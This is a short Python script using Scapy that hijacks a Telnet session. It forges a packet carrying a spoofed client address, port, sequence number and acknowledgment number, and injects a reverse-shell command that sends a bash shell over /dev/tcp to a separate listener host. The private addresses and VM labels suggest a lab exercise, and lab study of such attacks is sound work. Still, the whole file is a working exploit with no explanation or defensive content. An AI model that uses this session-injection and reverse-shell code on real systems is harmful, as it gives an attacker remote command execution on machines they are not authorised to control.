#!/usr/bin/env python3
from scapy.all import *

# Define communication endpoints
victim_server = "192.168.2.52"      # Destination: Server (VM2)
telnet_port = 23                      # Standard Telnet port
legit_client = "192.168.2.51"       # Source: Client (VM1)
client_port = 52662                  # Match this with sniffed client port

# TCP stream details captured during analysis
client_seq = 1000                  # Sequence number used by client
server_ack = 135                 # Acknowledgment from server

# Injected reverse shell command
reverse_cmd = "/bin/bash -i > /dev/tcp/192.168.2.53/9090 0<&1 2>&1\n"

# Construct packet with spoofed session data
ip_hdr = IP(src=legit_client, dst=victim_server)
tcp_hdr = TCP(sport=client_port, dport=telnet_port, seq=client_seq, ack=server_ack, flags="PA")
crafted_packet = ip_hdr / tcp_hdr / reverse_cmd

# Transmit malicious packet into the stream
send(crafted_packet, verbose=False)
